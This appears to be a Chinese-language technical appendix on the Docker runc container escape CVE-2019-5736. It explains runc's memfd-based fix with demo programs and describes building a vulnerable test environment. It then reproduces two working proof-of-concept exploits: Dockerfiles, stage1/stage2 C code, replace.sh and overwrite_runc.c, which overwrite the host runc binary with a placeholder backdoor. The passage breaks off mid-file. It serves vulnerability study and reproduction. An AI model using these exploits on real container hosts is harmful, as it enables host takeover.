target.xIAgUt\ninvincible@ubuntu:~/Desktop/test/mount_test$\u00a0\n*/\n\n\n\n\nclone_binary->make_execfd\n\n\n\u8fd9\u4e2a\u65b9\u6848\u4e2dmake_execfd\u521b\u5efa\u5185\u5b58\u6587\u4ef6\u4e5f\u6709\u4e09\u79cd\u65b9\u5f0f\uff1a\n\n\n\n\n\u901a\u8fc7\nmemfd_create\n\n\n\n\n#define RUNC_MEMFD_COMMENT \"runc_cloned:/proc/self/exe\"\n#ifndef MFD_CLOEXEC\n#\u00a0 define MFD_CLOEXEC\u00a0 \u00a0 \u00a0 \u00a00x0001U\n#\u00a0 define MFD_ALLOW_SEALING 0x0002U\n#endif\nstatic int make_execfd(int *fdtype)\n{\n    *fdtype = EFD_MEMFD;\n\n    fd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);\n\n    if (fd >= 0)\n        return fd;\n\n\n\n\n\u5173\u4e8e\nmemfd_create\n\uff1a\n\n\nmemfd_create() creates an anonymous file and returns a file\ndescriptor that refers to it.  The file behaves like a regular file,\nand so can be modified, truncated, memory-mapped, and so on.\nHowever, unlike a regular file, it lives in RAM and has a volatile\nbacking storage.\n\n\n\n\n\u53c2\u8003\uff1a \nhttps://cloud.tencent.com/developer/article/1551288\n\n\n\n\n\u901a\u8fc7open \u8bbe\u7f6e\nO_TMPFILE\n flag\u7684\u65b9\u5f0f\u521b\u5efa\u4e34\u65f6\u6587\u4ef6\n\n\n\n\n    *fdtype = EFD_FILE;\n    fd = open(prefix, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0700);\n    if (fstat(fd, &statbuf) >= 0)\n\u00a0 \u00a0 working_otmpfile = (statbuf.st_nlink == 0);\n    if (working_otmpfile)\n    \u00a0 return fd;\n\n\n\n\n\u5173\u4e8eopen\u51fd\u6570\u7684\nO_TMPFILE\n\u6807\u5fd7\uff1a\n\n\nO_TMPFILE (since Linux 3.11)\n\u00a0 \u00a0 Create an unnamed temporary regular file.\u00a0 The pathname argu\u2010\n\u00a0 \u00a0 ment specifies a directory; an unnamed inode will be created\n\u00a0 \u00a0 in that directory's filesystem.\u00a0 Anything written to the\n\u00a0 \u00a0 resulting file will be lost when the last file descriptor is\n\u00a0 \u00a0 closed, unless the file is given a name.\n\n\n\n\n\n\n\u901a\u8fc7mkostemp+unlink\n\n\n\n\n    /*\n     * Our final option is to create a temporary file the old-school way, and\n     * then unlink it so that nothing else sees it by accident.\n     */\n    *fdtype = EFD_FILE;\n    fd = mkostemp(template, O_CLOEXEC);\n    if (fd >= 0) {\n        if (unlink(template) >= 0)\n            return fd;\n\n\n\n\n\u5173\u4e8e\nmkostemp\n\uff1a\u7b80\u5355\u7684\u521b\u5efa\u4e00\u4e2a\u552f\u4e00\u540d\u79f0\u7684\u4e34\u65f6\u6587\u4ef6\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528\nopen\n\u51fd\u6570\u7684\u90e8\u5206flag\n\n\n\u5173\u4e8eunlink:\n\n\nunlink() deletes a name from the filesystem.\u00a0 If that name was the\nlast link to a file and no processes have the file open, the file is\ndeleted and the space it was using is made available for reuse.\n\n\n\n\nclone_binary->seal_execfd\n\n\n\n\n\u5f53\nmake_execfd\n\u4e2d\u901a\u8fc7\nmemfd_create\n\u6210\u529f\u521b\u5efa\u4e86\u5185\u5b58\u6587\u4ef6\u65f6\n\n\n\n\n\u901a\u8fc7\nfcntl\n\u4e3a\u6587\u4ef6\u6dfb\u52a0\nseals\n\uff0c\u5177\u4f53\u662f\u4f7f\u8be5\u5185\u5b58\u7a7a\u95f4\u4e0d\u53ef\u6269\u5927\u548c\u7f29\u5c0f\uff0c\u4e0d\u53ef\u5199\u5165\uff0c\u4e14\u8be5\u9650\u5236\u4e0d\u53ef\u4fee\u6539\uff1a\n\n\n#ifndef F_SEAL_SEAL\n#  define F_SEAL_SEAL   0x0001 /* prevent further seals from being set */\n#  define F_SEAL_SHRINK 0x0002 /* prevent file from shrinking */\n#  define F_SEAL_GROW   0x0004 /* prevent file from growing */\n#  define F_SEAL_WRITE  0x0008 /* prevent writes */\n#endif\n#define RUNC_MEMFD_SEALS \\\n    (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)\nstatic int seal_execfd(int *fd, int fdtype)\n{\n    switch (fdtype) {\n    case EFD_MEMFD:\n        return fcntl(*fd, F_ADD_SEALS, RUNC_MEMFD_SEALS);\n\n\n\n\n\n\n\u5982\u679c\u662f\u901a\u8fc7\u540e\u4e24\u79cd\u65b9\u5f0f\u521b\u5efa\u7684\u5185\u5b58\u6587\u4ef6(\nopen\n \u8bbe\u7f6e\nO_TMPFILE\n\u6216\u8005\nmkostemp+unlink\n)\n\n\n\n\n\u4f1a\u91cd\u65b0\u4f7f\u7528\nopen\n\u8bbe\u7f6e\nO_PATH\n flag\u6253\u5f00\u4e00\u6b21\uff0c\u8fd9\u662f\u4e3a\u4e86\u8ba9\nexecve\n\u53ef\u7528\u3002\n\n\n    case EFD_FILE: {\n        /* Need to re-open our pseudo-memfd as an O_PATH to avoid execve(2) giving -ETXTBSY. */\n        int newfd;\n        char fdpath[PATH_MAX] = {0};\n        if (fchmod(*fd, 0100) < 0)\n            return -1;\n        if (snprintf(fdpath, sizeof(fdpath), \"/proc/self/fd/%d\", *fd) < 0)\n            return -1;\n        newfd = open(fdpath, O_PATH | O_CLOEXEC);\n        if (newfd < 0)\n            return -1;\n        close(*fd);\n        *fd = newfd;\n        return 0;\n    }\n    default:\n    \u00a0 \u00a0break;\n    }\n    return -1;\n}\n\n\n\n\n\u5173\u4e8e\nopen\n \u7684\nO_PATH\n flag\uff1a\n\n\nO_PATH (since Linux 2.6.39)\n    ...\n\u00a0 \u00a0 One use of O_PATH for regular files is to provide the\n\u00a0 \u00a0 equivalent of POSIX.1's O_EXEC functionality.\u00a0 This permits us\n\u00a0 \u00a0 to open a file for which we have execute permission but not\n\u00a0 \u00a0 read permission, and then execute that file, with steps\n\u00a0 \u00a0 something like the following:\n\u00a0 \u00a0 char buf[PATH_MAX];\n\u00a0 \u00a0 fd = open(\"some_prog\", O_PATH);\n\u00a0 \u00a0 snprintf(buf, PATH_MAX, \"/proc/self/fd/%d\", fd);\n\u00a0 \u00a0 execl(buf, \"some_prog\", (char *) NULL);\n\n\u00a0 \u00a0 An O_PATH file descriptor can also be passed as the argument\n\u00a0 \u00a0 of fexecve(3).\n\n\n\n\ndemo1:\n\n\n//\u6f14\u793acreate_memfd + fexecve\u7684\u65b9\u5f0f\n// \u6ca1\u6709\u505a\u5f02\u5e38\u5904\u7406\n#define _GNU_SOURCE\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/sendfile.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#define RUNC_MEMFD_COMMENT \"runc_cloned:/proc/self/exe\"\n#ifndef F_SEAL_SEAL\n#\u00a0 define F_SEAL_SEAL\u00a0 \u00a00x0001  /* prevent further seals from being set */\n#\u00a0 define F_SEAL_SHRINK 0x0002  /* prevent file from shrinking */\n#\u00a0 define F_SEAL_GROW\u00a0 \u00a00x0004  /* prevent file from growing */\n#\u00a0 define F_SEAL_WRITE\u00a0 0x0008  /* prevent writes */\n#endif\n#define RUNC_MEMFD_SEALS \\\n    (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)\n\n#ifndef F_LINUX_SPECIFIC_BASE\n#\u00a0 define F_LINUX_SPECIFIC_BASE 1024\n#endif\n#ifndef F_ADD_SEALS\n#\u00a0 define F_ADD_SEALS (F_LINUX_SPECIFIC_BASE + 9)\n#\u00a0 define F_GET_SEALS (F_LINUX_SPECIFIC_BASE + 10)\n#endif\n\n/* Use our own wrapper for memfd_create. */\n#if !defined(SYS_memfd_create) && defined(__NR_memfd_create)\n#\u00a0 define SYS_memfd_create __NR_memfd_create\n#endif\n/* memfd_create(2) flags -- copied from <linux/memfd.h>. */\n#ifndef MFD_CLOEXEC\n#\u00a0 define MFD_CLOEXEC\u00a0 \u00a0 \u00a0 \u00a00x0001U\n#\u00a0 define MFD_ALLOW_SEALING 0x0002U\n#endif\nint memfd_create(const char *name, unsigned int flags)\n{\n#ifdef SYS_memfd_create\n    return syscall(SYS_memfd_create, name, flags);\n#else\n    errno = ENOSYS;\n    return -1;\n#endif\n}\n\nint main(int argc, char *argv[]){\n    if(argc > 1){\n        if(strcmp(argv[1], \"stage2\") == 0){ \n            printf(\"Stage 2 ok\\n\");\n            return 0;\n        }\n        else{\n            return -1;\n        }\n    }   \n    // \u901a\u8fc7memfd_create\u521b\u5efa\u5185\u5b58\u6587\u4ef6\n    int fd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);\n    printf(\"%d\\n\", fd);\n    // \u628a/proc/self/exe \u590d\u5236\u5230 memfd_create\u521b\u5efa\u7684\u5185\u5b58\u6587\u4ef6\n    int exefd = open(\"/proc/self/exe\", O_RDONLY | O_CLOEXEC);\n    size_t sent = 0;\n    struct stat statbuf = {};\n    fstat(exefd, &statbuf);\n    while (sent < statbuf.st_size) {\n        int n = sendfile(fd, exefd, NULL, statbuf.st_size - sent);\n        sent += n;\n    }\n    close(exefd);\n    printf(\"sent: %ldbytes\\n\", sent);\n    // \u6dfb\u52a0seals\u7ea6\u675f    \n    if(fcntl(fd, F_ADD_SEALS, RUNC_MEMFD_SEALS) < 0){\n        perror(\"fcntl error\");\n    }\n    // \u6267\u884cstage2\n    char *env[] = {NULL};\n    char *argv2[] = {\"\", \"stage2\", NULL};\n    fexecve(fd, argv2, env);\n    perror(\"fexecve error\");\n}\n/*\n$ gcc memfd_create_demo.c -o memfd\n$ ./memfd\u00a0\n3\nsent: 9288bytes\nStage 2 ok\n*/\n\n\n\n\ndemo2:\n\n\n// \u6f14\u793aopen O_TEMPFILE + open O_PATH + fexecve\u7684\u65b9\u5f0f\n// \u6ca1\u6709\u505a\u5f02\u5e38\u5904\u7406\n#define _GNU_SOURCE\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n\u00a0#include <sys/sendfile.h>\nint main(int argc, char *argv[]){\n    if(argc > 1){\n        if(strcmp(argv[1], \"stage2\") == 0){ \n            printf(\"Stage 2 ok\\n\");\n            return 0;\n        }\n        else{\n            return -1;\n        }\n    }\n    struct stat statbuf = {};\n    size_t sent = 0;\n    char **environ;\n    char *argv2[] = {\"opath\", \"stage2\", NULL};\n    int fd = open(\"./\", O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0700);\n    int exefd = open(\"/proc/self/exe\", O_RDONLY | O_CLOEXEC);\n    fstat(exefd, &statbuf);\n    while (sent < statbuf.st_size) {\n        int n = sendfile(fd, exefd, NULL, statbuf.st_size - sent);\n        sent += n;\n    }\n    close(exefd);\n    fchmod(fd, 0100);\n    char fdpath[1024];\n    snprintf(fdpath, sizeof(fdpath), \"/proc/self/fd/%d\", fd);\n    int newfd = open(fdpath, O_PATH | O_CLOEXEC);\n    close(fd);\n    fexecve(newfd, argv2, environ);\n    // fexecve(fd, argv2, environ);\n    perror(\"fexecve error\");\n}\n/*\n$ gcc open_opath_demo.c -o opath\n$ ./opath\u00a0\nStage 2 ok\n*/",
            "title": "Cve 2019 5736 \u9644\u4ef6"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#docker-runccve-2019-5736",
            "text": "",
            "title": "Docker runc\u5bb9\u5668\u9003\u9038\u6f0f\u6d1e\u5206\u6790\u9644\u4ef6(CVE-2019-5736)"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#_1",
            "text": "Docker  https://docs.docker.com/get-started/overview/  https://docs.docker.com/engine/reference/run/  https://docs.docker.com/engine/reference/commandline/exec/  Dockerfile  https://docs.docker.com/engine/reference/builder/  https://docs.docker.com/engine/reference/builder/#from  https://docs.docker.com/engine/reference/builder/#run  https://docs.docker.com/engine/reference/builder/#add  https://docs.docker.com/engine/reference/builder/#entrypoint  OCI\u548crunc  https://cizixs.com/2017/11/05/oci-and-runc/  \u51e0\u4e2a\u6613\u6df7\u6dc6\u7684\u6982\u5ff5        runc\u548cdocker-runc \nrunc\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u8fdb\u7a0b\uff0cdocker-runc\u662f\u5b89\u88c5docker\u540e\uff0cdocker\u81ea\u5e26\u7684runc\uff0c\u6587\u4e2d\u63d0\u5230\u7684\u53ef\u4ee5\u7406\u89e3\u6210\u76f8\u540c\u7684\u610f\u601d\u3002    docker.io\u548cdocker-ce \ndocker.io\u662fubuntu\u7684docker package\u7684\u540d\u79f0;\n\u5982\u679c\u4ecedocker\u5b98\u65b9\u6e90\u4e0b\u8f7d\u5219\u662fdocker-ce, docker-ce-cli, containerd.io\u3002\n\u672c\u6587\u7528\u7684\u662f\u6709\u6f0f\u6d1e\u7248\u672c\u7684ubuntu package \u3002    Linux Namespace  https://lwn.net/Articles/531114/  Linux Control Group  https://www.infoq.cn/article/docker-kernel-knowledge-cgroups-resource-isolation/     cgroups (abbreviated from control groups) is a Linux kernel feature that limits, accounts for, and isolates the resource usage (CPU, memory, disk I/O, network, etc.) of a collection of processes.  cgroups\u7528\u4e8e\u5bf9\u4e00\u7ec4\u8fdb\u7a0b\u53ef\u4ee5\u4f7f\u7528\u7684\u7cfb\u7edf\u8d44\u6e90\u505a\u9650\u5236\u3002  libseccomp  https://github.com/seccomp/libseccomp  The libseccomp library provides an easy to use, platform independent, interface to the Linux Kernel's syscall filtering mechanism.  runc\u7684\u4e00\u4e2a\u4f9d\u8d56\u5e93\uff0c\u7528\u4e8e\u9650\u5236\u5bb9\u5668\u8fdb\u7a0b\u53ef\u4f7f\u7528\u7684\u7cfb\u7edf\u8c03\u7528\u3002  $ ldd /usr/sbin/runc\n    linux-vdso.so.1 (0x00007fffd11e6000)\n    libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f5f0bde7000)\n    libseccomp.so.2 => /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007f5f0bba0000)\n    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5f0b7af000)\n    /lib64/ld-linux-x86-64.so.2 (0x00007f5f0c006000)  procfs \nporc\u6587\u4ef6\u7cfb\u7edf\u662f\u4e00\u4e2a\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff0c\u901a\u5e38mount\u5230/proc\u76ee\u5f55\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u7cfb\u7edf\u5185\u6838\u5411\u7528\u6237\u6001\u5f00\u653e\u7684\u63a5\u53e3\u3002  /proc/self/exe  \u662f\u5f53\u524d\u8fdb\u7a0b\u53ef\u6267\u884c\u6587\u4ef6\u7684\u7b26\u53f7\u94fe\u63a5\uff1b    /proc/self/fd  \u662f\u4e00\u4e2a\u76ee\u5f55\uff0c\u5305\u542b\u4e86\u5f53\u524d\u8fdb\u7a0b\u6253\u5f00\u7684\u6587\u4ef6\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u7b26\u53f7\u94fe\u63a5\u540d\u79f0\u4ee5\u6587\u4ef6\u63cf\u8ff0\u7b26\u547d\u540d\u3002  $ more exploit.c \n\n$ ps -aux|grep -v grep|grep more\ninvinci+  18760  0.0  0.0  16836   900 pts/5    S+   03:28   0:00 more exploit.c\n$ cd /proc/18760/fd\n$ ls\n0  1  2  3\n$ file 3\n3: symbolic link to /home/invincible/Desktop/runc_test/exp/exploit.c",
            "title": "\u57fa\u7840\u77e5\u8bc6"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#_2",
            "text": "",
            "title": "\u73af\u5883\u642d\u5efa"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#_3",
            "text": "\u7cfb\u7edf\u955c\u50cf\uff1a https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/18.04/ubuntu-18.04.4-desktop-amd64.iso  # \u00a0\u521b\u5efa\u865a\u62df\u673a\u786c\u76d8\n$ qemu-img create -f qcow2 ubuntu18.04.4.img 10G\n\n# \u5b89\u88c5\u865a\u62df\u673a\n$ qemu-system-x86_64  -m 2048 -hda ubuntu18.04.4.img -cdrom ./ubuntu-18.04.4-desktop-amd64.iso\n\n# \u542f\u52a8\u865a\u62df\u673a\n$ qemu-system-x86_64 -m 2048  ubuntu18.04.4.img",
            "title": "\u865a\u62df\u673a\u5b89\u88c5"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#docker",
            "text": "\u4f7f\u7528Ubunt\u7684\u53d1\u884c\u7248\u672c\u7684packeg: docker-io ( Docker\u5b98\u65b9\u4ed3\u5e93\u7684packges: docker-ce, docker-ce-cli, container.io \u6f0f\u6d1e\u5df2\u7ecf\u4fee\u590d)  \u67e5\u770b\u53ef\u5b89\u88c5\u7248\u672c:  $ apt-cache policy docker.io\ndocker.io:\n\u00a0 Installed: 17.12.1-0ubuntu1\n\u00a0 Candidate: 19.03.6-0ubuntu1~18.04.1\n\u00a0 Version table:\n\u00a0 \u00a0 \u00a019.03.6-0ubuntu1~18.04.1 500\n\u00a0 \u00a0 \u00a0 \u00a0 500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-updates/universe amd64 Packages\n\u00a0 \u00a0 \u00a018.09.7-0ubuntu1~18.04.4 500\n\u00a0 \u00a0 \u00a0 \u00a0 500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-security/universe amd64 Packages\n\u00a0*** 17.12.1-0ubuntu1 500\n\u00a0 \u00a0 \u00a0 \u00a0 500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic/universe amd64 Packages\n\u00a0 \u00a0 \u00a0 \u00a0 100 /var/lib/dpkg/status  \u67e5\u770bdocker.io\u7684changelog:  $ PAGER=cat apt-get -q=2 changelog docker.io \n...\ndocker.io (18.09.2-0ubuntu1) disco; urgency=medium\n\n\u00a0 * Update to 18.09.2, including fix for CVE-2019-5736.\n\u00a0 \u00a0 - Convert components/engine/git-bundles/CVE-2019-5736.bundle into\n\u00a0 \u00a0 \u00a0 d/patches/0001-nsenter-clone-proc-self-exe-to-avoid-exposing-host-b.patch.\n\u00a0 \u00a0 - Hard code RUNC_COMMIT in d/rules for now.\n\n\u00a0-- Michael Hudson-Doyle <michael.hudson@ubuntu.com>\u00a0 Tue, 12 Feb 2019 10:55:11 +1300\n\n...  \u5728 \u5b98\u7f51 \u4e0b\u8f7d\u4f4e\u7248\u672c package \uff0c\u6216\u8005 \u767e\u5ea6\u4e91  \u5bc6\u7801:q9vg\uff0c\u4e0b\u8f7d\u540e\u5b89\u88c5\uff1a  $\u00a0sudo dpkg -i docker.io_17.12.1-0ubuntu1_amd64.deb\n...\n\n$ docker --version\nDocker version 17.12.1-ce, build 7390fc6\n\n$ docker-runc --version\nrunc version 1.0.0-rc4+dev\ncommit: 9f9c96235cc97674e935002fc3d78361b696a69e\nspec: 1.0.0  \u6216\u8005\u76f4\u63a5apt-get\u5b89\u88c5(\u5982\u679c\u8fd8\u6709\u7684\u8bdd)\uff1a  $ sudo apt-get install docker.io=17.12.1-0ubuntu1",
            "title": "Docker\u5b89\u88c5"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#poc",
            "text": "\u4f7f\u7528\u7684\u662f\u901a\u8fc7\u6784\u9020\u6076\u610f\u5bb9\u5668\u955c\u50cf\uff0c\u5f53\u8fd0\u884c\u5bb9\u5668\u65f6\u89e6\u53d1\u6f0f\u6d1e\u7684\u65b9\u5f0f( Docker run )\u3002  \u94fe\u63a5: https://pan.baidu.com/s/1HKZREeCc3TCu7LPTv5wm7A \u00a0 \u5bc6\u7801:piqr  $ tree\n.\n\u251c\u2500\u2500 Dockerfile\n\u251c\u2500\u2500 README\n\u251c\u2500\u2500 stage1.c\n\u2514\u2500\u2500 stage2.c\n\n0 directories, 4 files  $ cat Dockerfile\nFROM ubuntu:18.04\n# \u7ee7\u627fubuntu:18.04 image\nRUN set -e -x ;\\\n\u00a0 \u00a0 sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\\\n\u00a0 \u00a0 apt -y update ;\\\n\u00a0 \u00a0 apt-get -y install build-essential ;\\\n\u00a0 \u00a0 cd /root ;\\\n\u00a0 \u00a0 apt-get -y build-dep libseccomp ;\\\n\u00a0 \u00a0 apt-get source libseccomp\n\u00a0 \u00a0\u00a0\nADD stage1.c /root/stage1.c\nRUN set -e -x ;\\\n\u00a0 \u00a0 cd /root/libseccomp-* ;\\\n\u00a0 \u00a0 cat /root/stage1.c >> src/api.c ;\\\n\u00a0 \u00a0 DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\\\n\u00a0 \u00a0 dpkg -i /root/*.deb\n# libseccomp\u662frunc\u52a0\u8f7d\u7684\u4e00\u4e2a\u52a8\u6001\u5e93\n# \u539fPoc\u8fd9\u91cc\u662fcd /root/libseccomp-2.3.1, \u4f46\u662fapt-get source libseccomp\u4f1a\u5b89\u88c5\u6700\u65b0\u7684\u7248\u672c\uff0c\u6240\u4ee5\u8fd9\u4e2a\u7248\u672c\u53f7\u9700\u8981\u4fee\u6539\n# \u8fd9\u51e0\u6b65\u662f\u4e0b\u8f7dlibseccomp\u7684\u6e90\u7801\u5305\uff0c\u4fee\u6539\u6e90\u7801\u7684src/api.c\u6587\u4ef6\uff0c\u8ffd\u52a0\u5199\u5165\u4e86stage1.c\u7684\u5185\u5bb9(\u7ed9api.c\u589e\u52a0\u4e86\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u5728\u5b83\u7684main\u51fd\u6570\u4e4b\u524d\u6267\u884c)\uff0c\u5c06\u4fee\u6539\u7684libseccomp\u6784\u5efa\u6210dep\u5305\u5e76\u5b89\u88c5\n\nADD stage2.c /root/stage2.c\nRUN set -e -x ;\\\n\u00a0 \u00a0 cd /root ;\\\n\u00a0 \u00a0 gcc stage2.c -o /stage2\n# \u7f16\u8bd1stage2.c\uff0c\u7b49\u5f85\u88abstage1\u52a0\u8f7d\u5e76\u6267\u884c\n\nENTRYPOINT [ \"/entrypoint\" ]\n\n\nRUN set -e -x ;\\\n\u00a0 \u00a0 ln -s /proc/self/exe /entrypoint\n# \u628a/proc/self/exe\u8bbe\u7f6e\u4e3a\u5bb9\u5668\u7684entrypoint\uff0c\u8ba9runc\u8fd0\u884c\u5bb9\u5668\u65f6\u6267\u884c/proc/self/exe\n# \u5373\u5728\u5bb9\u5668iamge\u4e2d\u6267\u884crunc\u8fdb\u7a0b\uff0c\u8fdb\u800c\u52a0\u8f7d\u6076\u610f\u6784\u9020\u7684\u52a8\u6001\u5e93\uff0c\u6267\u884c\u540e\u9762\u7684exp\u4ee3\u7801(stage1.c stage2.c, \u5b8c\u6210\u5bf9runc\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4fee\u6539)  $ cat stage1.\n\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n\n\n__attribute__ ((constructor)) void foo(void)\n{\n\u00a0 \u00a0 int fd = open(\"/proc/self/exe\", O_RDONLY);\n\u00a0 \u00a0 if (fd == -1 ) {\n\u00a0 \u00a0 \u00a0 \u00a0 printf(\"HAX: can't open /proc/self/exe\\n\");\n\u00a0 \u00a0 \u00a0 \u00a0 return;\n\u00a0 \u00a0 }\n\u00a0 \u00a0 printf(\"HAX: fd is %d\\n\", fd);\n\u00a0 \u00a0 char *argv2[3];\n\u00a0 \u00a0 argv2[0] = strdup(\"/stage2\");\n\u00a0 \u00a0 char buf[128];\n\u00a0 \u00a0 snprintf(buf, 128, \"/proc/self/fd/%d\", fd);\n\u00a0 \u00a0 argv2[1] = buf;\n\u00a0 \u00a0 argv2[2] = 0;\n\u00a0 \u00a0 execve(\"/stage2\", argv2, NULL);\n}\n\n\n/*\n\n\n__attribute__ ((constructor))\nThe constructor attribute causes the function to be called automatically before execution enters main ().\u00a0\n\n\n\u6253\u5f00\u5f53\u524d\u8fdb\u7a0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0cexecve\u6267\u884c\u5b50\u8fdb\u7a0bstage2\u5e76\u5c06\u6587\u4ef6\u63cf\u8ff0\u7b26\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9stage2\n*/  $ cat stage2.c\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <errno.h>\n\n\nint main(int argc, char **argv) {\n\u00a0 \u00a0 printf(\"HAX2: argv: %s\\n\", argv[1]);\n\u00a0 \u00a0 int fd = open(argv[1], O_RDWR|O_APPEND);\n\u00a0 \u00a0 printf(\"HAX2: fd: %d\\n\", fd);\n\n\u00a0 \u00a0 const char *poc = \"cve-2019-5736\";\n\u00a0 \u00a0 int res = write(fd, poc, strlen(poc));\n\u00a0 \u00a0 printf(\"HAX2: res: %d, %d\\n\", res, errno);\n}\n\n/*\n\u6839\u636estage1\u4f20\u5165\u7684runc\u8def\u5f84\uff0c \u5c06poc\u8ffd\u52a0\u5199\u5165\u8be5\u6587\u4ef6\u672b\u5c3e\uff0c\u5b8c\u6210\u5bf9\u5bbf\u4e3b\u673arunc\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4fee\u6539\u3002\n*/",
            "title": "\u590d\u73b0\u73af\u5883PoC"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#exp",
            "text": "\u94fe\u63a5: https://pan.baidu.com/s/1d1ABdQLDdKwEKkX2dW-cbw \u00a0 \u5bc6\u7801:83fs  twistlock@github",
            "title": "\u590d\u73b0\u73af\u5883Exp"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/#poc_1",
            "text": "https://github.com/twistlock/RunC-CVE-2019-5736     \u5176\u4ed6\u7248\u672c-Go\u7248\u672c\uff1a by Frichetten@github \n\u5176\u4ed6\u7248\u672c-C\u7248\u672c\uff1a by feexd @github     \u4e0b\u9762\u4ecb\u7ecd\u7684\u662f\u6784\u9020\u6076\u610f\u5bb9\u5668\u8fdb\u7a0b\u89e6\u53d1\u6f0f\u6d1e\u7684Poc\u3002\u8fd9\u79cd\u65b9\u5f0f\u89e6\u53d1\u6761\u4ef6\u6bd4\u53e6\u4e00\u79cd\u65b9\u5f0f\u8981\u66f4\u4e3a\u82db\u523b\uff0c\u5b9e\u9645\u6d4b\u8bd5\u65f6\u7531\u4e8e\u65e0\u6cd5\u63a7\u5236\u7a0b\u5e8f\u65f6\u5e8f\uff0c\u5c1d\u8bd5\u4e86\u51e0\u6b21\u90fd\u5931\u8d25\u4e86\u3002  $ tree\n.\n\u251c\u2500\u2500 Dockerfile\n\u251c\u2500\u2500 bash_evil\n\u251c\u2500\u2500 new_runc\n\u251c\u2500\u2500 new_runc.c\n\u251c\u2500\u2500 overwrite_runc\n\u251c\u2500\u2500 overwrite_runc.c\n\u2514\u2500\u2500 replace.sh  $ cat Dockerfile\nFROM ubuntu:18.04\n\nCOPY replace.sh /\nRUN [\"chmod\", \"+x\", \"/replace.sh\"]\nCOPY overwrite_runc /overwrite_runc\nRUN [\"chmod\", \"+x\", \"/overwrite_runc\"]\nCOPY new_runc /\n\nRUN [\"mv\", \"/bin/bash\", \"/bin/bash_original\"]\nCOPY bash_evil /bin/bash\nRUN [\"chmod\", \"+x\", \"/bin/bash\"]\n\nENTRYPOINT [\"/bin/bash_original\", \"/replace.sh\"]\n\n# \u5c06replace.sh, overwrite_runc, new_runc\u590d\u5236\u5230\u5bb9\u5668iamge\n# \u5c06\u5bb9\u5668image\u7684/bin/bash \u66ff\u6362\u6210bash_evil\n# \u5c06replace.sh\u4f5c\u4e3aentrypoint\u5728docker run\u65f6\u6267\u884c  $ cat bash_evil\n#!/proc/self/exe  $ cat replace.sh\n#!/bin/bash_original\necho \"[+] Waiting for runC to be executed in the container...\"\n\nrunc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')\n\n# Wait for /proc/self/exe to be executed\nwhile [ -z \"$runc_pid\" ]\ndo\n    runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')\ndone\n\n# Call overwrite_runc with the symlink to the runC binary\n./overwrite_runc /proc/${runc_pid}/exe\n\n# 1. \u6301\u7eed\u68c0\u6d4b\u8fdb\u7a0b\uff0c\u7b49\u5f85runc\u8fdb\u7a0b\u51fa\u73b0(\u8868\u793a\u4fee\u6539\u540e\u7684/bin/sh\u88abrunc exec\u6267\u884c)\n# 2. \u6267\u884coverwrite_runc\u4fee\u6539/proc/[runc-pid]/exe\u6587\u4ef6\u4e3anew_runc  $ cat new_runc.c\n\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n\nint main(int argc, char *argv[])\n{\n    printf(\"\\n**THE ALL NEW AND IMPROVED RUNC**\\n\\n\");\n    printf(\"\\t[+] Your backdoor here ->\\n\\n\");\n    return 0;\n}\n// \u8fd9\u91cc\u662f\u8986\u76d6runc\u6587\u4ef6\u7684payload\u4ee3\u7801   $ cat overwrite_runc.c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <errno.h>\n\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n\n/* Simple Buffer*/\ntypedef struct Buffer\n{\n    int len;        // buffer length\n    void * buff;    // buffer data\n} Buffer;\n\n\n#define FALSE 0\n#define TRUE  1\n\nconst char * DEFAULT_NEW_RUNC_PATH = \"/new_runc\";\nconst unsigned 